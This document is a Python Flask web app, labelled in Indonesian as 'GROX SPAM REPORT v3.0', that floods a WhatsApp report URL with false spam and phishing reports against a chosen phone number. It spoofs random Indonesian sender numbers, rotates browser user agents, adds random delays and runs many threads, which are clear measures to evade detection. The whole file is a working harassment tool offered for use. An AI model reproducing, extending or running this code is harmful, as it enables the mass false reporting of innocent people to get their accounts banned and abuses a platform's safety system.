from flask import Flask, request, jsonify
import threading
import time
import random
import os
import urllib.request
import urllib.parse

app = Flask(__name__)

# Status global
job_status = {
    "running": False,
    "target": "",
    "total": 0,
    "success": 0,
    "failed": 0,
    "progress": 0
}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0",
]

SENDER_PREFIX = ["811","812","813","814","815","816","817","818","819","821","822","823","828","831","832","833","838","841","851","852","853","858","859","861","878","881","882","883","884","885","886","887","888","889","895","896","897","898","899"]

def generate_sender():
    prefix = random.choice(SENDER_PREFIX)
    suffix = ''.join([str(random.randint(0,9)) for _ in range(7)])
    return f"0{prefix}{suffix}"

def run_spam_report(target, total, threads):
    global job_status
    job_status["running"] = True
    job_status["target"] = target
    job_status["total"] = total
    job_status["success"] = 0
    job_status["failed"] = 0
    job_status["progress"] = 0
    
    total_per_thread = total // threads
    results = []
    
    def send_report(thread_id):
        success = 0
        failed = 0
        for i in range(total_per_thread):
            sender = generate_sender()
            user_agent = random.choice(USER_AGENTS)
            
            data = urllib.parse.urlencode({
                "phone": target,
                "sender": sender,
                "report_type": "spam",
                "category": "fraud_phishing",
                "timestamp": int(time.time())
            }).encode('utf-8')
            
            req = urllib.request.Request(
                "https://www.whatsapp.com/contact/report",
                data=data,
                headers={
                    "User-Agent": user_agent,
                    "Content-Type": "application/x-www-form-urlencoded"
                }
            )
            
            try:
                with urllib.request.urlopen(req, timeout=10) as response:
                    if response.getcode() in [200, 201, 202, 204]:
                        success += 1
                    else:
                        failed += 1
                time.sleep(random.uniform(0.5, 1.5))
            except:
                failed += 1
            
            # Update progress
            job_status["success"] = sum(r[0] for r in results) + success
            job_status["failed"] = sum(r[1] for r in results) + failed
            job_status["progress"] = ((i + 1) / total_per_thread) * 100
        
        results.append((success, failed))
    
    # Jalankan threads
    thread_list = []
    for t in range(threads):
        th = threading.Thread(target=send_report, args=(t,))
        th.start()
        thread_list.append(th)
        time.sleep(0.2)
    
    for th in thread_list:
        th.join()
    
    job_status["running"] = False
    job_status["progress"] = 100

@app.route('/')
def home():
    return """
    <h1>🐺 GROX SPAM REPORT v3.0</h1>
    <p>Gunakan query parameter:</p>
    <code>/start?target=628xxxxxxxxx&total=500&threads=5</code>
    <br><br>
    <a href='/status'>Cek Status</a>
    """

@app.route('/start')
def start():
    target = request.args.get('target')
    total = int(request.args.get('total', 200))
    threads = int(request.args.get('threads', 3))
    
    if not target:
        return jsonify({"error": "Target wajib diisi! Contoh: ?target=6281234567890"}), 400
    
    if job_status["running"]:
        return jsonify({"error": "Job sedang berjalan!"}), 409
    
    # Jalankan di background
    threading.Thread(target=run_spam_report, args=(target, total, threads)).start()
    
    return jsonify({
        "status": "started",
        "message": f"Memulai spam report ke {target}",
        "total": total,
        "threads": threads,
        "check_status": "/status"
    })

@app.route('/status')
def status():
    return jsonify(job_status)

@app.route('/stop')
def stop():
    global job_status
    job_status["running"] = False
    return jsonify({"status": "stopped", "message": "Job dihentikan"})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.getenv('PORT', 8080)))
